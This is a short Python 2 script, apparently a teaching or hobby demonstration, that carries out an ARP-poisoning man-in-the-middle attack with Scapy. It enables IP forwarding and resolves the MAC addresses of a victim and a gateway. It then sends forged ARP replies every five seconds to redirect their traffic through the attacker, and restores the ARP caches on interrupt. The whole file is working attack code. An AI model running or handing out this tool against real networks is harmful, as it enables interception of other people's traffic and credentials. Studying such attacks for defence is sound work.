## This is a representation of the Man in the middle attack using Scapy
'''
Usage: 
    - python mitm.py <target_ip_address>

'''

import os, sys, time
from scapy.all import *


def poison(gMAC, vMAC, gIP, vIP):
    send(ARP(op = 2, pdst = vIP, psrc = gIP, hwdst = vMAC), verbose=0)
    send(ARP(op = 2, pdst = gIP, psrc = vIP, hwdst = gMAC), verbose=0)

def cure(gMAC, vMAC, gIP, vIP):
    send(ARP(op = 2, pdst = gIP, psrc = vIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = vMAC), count = 5)
    send(ARP(op = 2, pdst = vIP, psrc = gIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gMAC), count = 5)

def attack(gatewayMAC, victimMAC, gatewayIP, victimIP):
    try:
        print "Poisioning..!!"
        while True:
            poison(gatewayMAC, victimMAC, gatewayIP, victimIP)
            time.sleep(5)
    except KeyboardInterrupt:
        print "Restoring ARP cache..!!"
        cure(gatewayMAC, victimMAC, gatewayIP, victimIP)
        print "Exiting..!!"
        sys.exit(1)


def Main():

    interface = raw_input("Enter the interface: ")
    victimIP = raw_input("Enter the victims IP: ")
    gatewayIP = raw_input("Enter the routers IP: ")

    print "\nEnabling IP forwarding..\n"
    os.system("sudo echo 1 > /proc/sys/net/ipv4/ip_forward")

    try:
        ans_victims, unans_victims = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = victimIP), timeout = 2, iface = interface, inter = 0.1)
        victimMAC = ans_victims[0][1].hwsrc
        ans_gateway, unans_gateway = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = gatewayIP), timeout = 2, iface = interface, inter = 0.1)
        gatewayMAC = ans_gateway[0][1].hwsrc

#        print "Victim's MAC addrs: " + victimMac
#        print "Gateway's MAC addrs: " + gatewayMAC

    except Exception:
        print "Unable to get MAC Addrs..!! Because of: "+str(Exception)
        print "Exiting..!!"
        sys.exit(1)

    attack(gatewayMAC, victimMAC, gatewayIP, victimIP)


if __name__ == '__main__':
    Main()
    
